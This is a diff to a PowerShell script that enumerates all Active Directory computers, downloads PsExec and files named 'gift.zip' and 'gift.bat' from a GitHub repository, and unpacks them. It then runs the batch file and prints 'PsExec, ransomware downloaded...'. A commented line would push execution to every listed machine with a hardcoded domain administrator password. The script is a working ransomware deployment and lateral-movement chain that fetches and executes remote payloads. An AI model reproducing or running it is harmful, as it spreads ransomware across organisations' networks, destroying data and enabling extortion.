@@ -3,6 +3,7 @@ cd $env:temp
 (Get-AdComputer -Filter *).Name | Out-File $env:temp\computers.txt; type $env:temp\computers.txt_
 curl https://github.com/d77juan/t3st1n6/raw/main/psexec33 -o $env:temp\psexec.exe
 curl https://github.com/d77juan/t3st1n6/raw/main/gift.zip -o $env:temp\gift.zip
+curl https://github.com/d77juan/t3st1n6/raw/main/gift.bat -o $env:temp\gift.bat
 Expand-archive $env:temp\gift.zip .
 $retry = $True
 while ($retry) {
@@ -14,4 +15,4 @@ while ($retry) {
 }
 echo PsExec, ransomware downloaded...
 #powershell "cd $env:temp;type .\computers.txt|%{.\psexec $_ -d -accepteula -u vonese\administrator -p Zxcv7890! 'notepad.exe'}"
-
+.\gift.bat
